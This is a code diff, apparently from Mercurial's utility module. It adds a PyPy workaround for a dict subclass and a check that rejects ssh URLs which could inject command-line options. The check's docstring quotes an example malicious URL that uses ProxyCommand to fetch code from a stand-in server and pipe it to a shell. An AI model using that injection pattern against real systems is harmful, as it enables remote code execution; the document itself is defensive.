@@ -584,6 +584,14 @@ class sortdict(collections.OrderedDict):
             del self[key]
         super(sortdict, self).__setitem__(key, value)
 
+    if pycompat.ispypy:
+        # __setitem__() isn't called as of PyPy 5.8.0
+        def update(self, src):
+            if isinstance(src, dict):
+                src = src.iteritems()
+            for k, v in src:
+                self[k] = v
+
 @contextlib.contextmanager
 def acceptintervention(tr=None):
     """A context manager that closes the transaction on InterventionRequired
@@ -2885,6 +2893,21 @@ def hasdriveletter(path):
 
 def urllocalpath(path):
     return url(path, parsequery=False, parsefragment=False).localpath()
+
+def checksafessh(path):
+    """check if a path / url is a potentially unsafe ssh exploit (SEC)
+
+    This is a sanity check for ssh urls. ssh will parse the first item as
+    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
+    Let's prevent these potentially exploited urls entirely and warn the
+    user.
+
+    Raises an error.Abort when the url is unsafe.
+    """
+    path = urlreq.unquote(path)
+    if path.startswith('ssh://-') or path.startswith('svn+ssh://-'):
+        raise error.Abort(_('potentially unsafe url: %r') %
+                          (path,))
 
 def hidepassword(u):
     '''hide user credential in a url string'''
